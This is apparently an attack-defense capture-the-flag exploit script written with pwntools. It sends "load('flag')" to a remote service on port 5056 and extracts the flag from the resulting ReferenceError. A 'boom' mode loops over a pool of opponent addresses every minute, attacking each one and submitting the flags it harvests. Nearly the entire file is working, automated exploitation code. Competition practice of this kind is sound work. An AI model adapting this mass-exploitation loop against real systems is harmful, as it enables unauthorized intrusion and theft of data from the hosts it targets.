#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
from submit import submit_flag
from time import sleep
import threading
import os
from team import team

PREFIX = '172.16.5.'
TIMEOUT = 5 #TODO
DELAY = 60
LIST = range(10, 35) # victim pool
ME = 12
PORT = 5056

context.arch = 'amd64'
def exploit(r, trash=False):
    r.sendlineafter('> ', "load('flag')")
    flag = r.clean(1)
    if 'ReferenceError' in flag:
        flag = flag.split('ReferenceError: \'')[1]
        r.close()
        return flag[:32]
    else:
        r.close()
        return ''

def boom():
    while True:
        for i in LIST:
            if i == ME:
                continue
            ip = PREFIX + str(i)
            print 'pwning %s' % ip
            try:
                flag = exploit(remote(ip, PORT, timeout=TIMEOUT,), trash=False)
                submit_flag(flag)
            except:
                warning('failed: %s %s' % (ip, team[ip]))
            #for j in range(10):
            #    exploit(remote(ip, PORT, timeout=TIMEOUT,), trash=True)
        sleep(DELAY)

if len(sys.argv) > 2: # attack one
    context.log_level = 'debug'
    submit_flag(exploit(remote(sys.argv[1], sys.argv[2], timeout=TIMEOUT)))
elif len(sys.argv) > 1:
    if sys.argv[1] == 'boom': # pwning all
        context.log_level = 'info'
        boom()
    else: # debug
        libc = ELF('/home/hdt/ldlibc/libc-2.24.dbg')
        os.environ['LD_LIBRARY_PATH'] = '/dbg64/'
        exploit(code.process())
        #r = remote('127.0.0.1', 4444)
else: # local
    libc = code.libc
    exploit(code.process())

